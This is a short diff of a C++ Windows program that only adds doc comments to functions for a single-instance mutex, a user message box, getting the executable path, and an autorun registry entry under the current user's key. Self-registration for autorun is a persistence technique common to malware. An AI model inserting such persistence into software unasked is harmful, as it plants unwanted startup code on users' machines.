@@ -28,7 +28,9 @@ enum class StatusCode {
 };
 
 
-
+/*
+@brief created a named mutex and makes sure none exist
+*/
 void createSingleMutex() {
 	g_hMutex = OpenMutexA(SYNCHRONIZE, FALSE, MUTEXNAME);
 	if (g_hMutex != NULL) {
@@ -44,6 +46,10 @@ void createSingleMutex() {
 	}
 }
 
+
+/*
+@brief pops a message for the user
+*/
 void userMessageStage() {
 	int msgboxID = MessageBox(
 		NULL,
@@ -56,6 +62,12 @@ void userMessageStage() {
 	}
 }
 
+
+/*
+@brief gets the path of the current executable
+
+@return std::string representing the quoted path
+*/
 std::string getFilePath() {
 	CHAR myPath[MAX_PATH_SIZE];
 	LPSTR currentPath = myPath;
@@ -70,6 +82,12 @@ std::string getFilePath() {
 	return newPath;
 }
 
+
+/*
+@brief sets an autorun of the filepath
+
+@param filePath std::string of the executable to be added tothe autorun
+*/
 void SetAutoRun(std::string filePath) {
 	HKEY targetKey;
 	LSTATUS openStat = RegOpenKeyA(HKEY_CURRENT_USER, AUTORUNS, &targetKey);
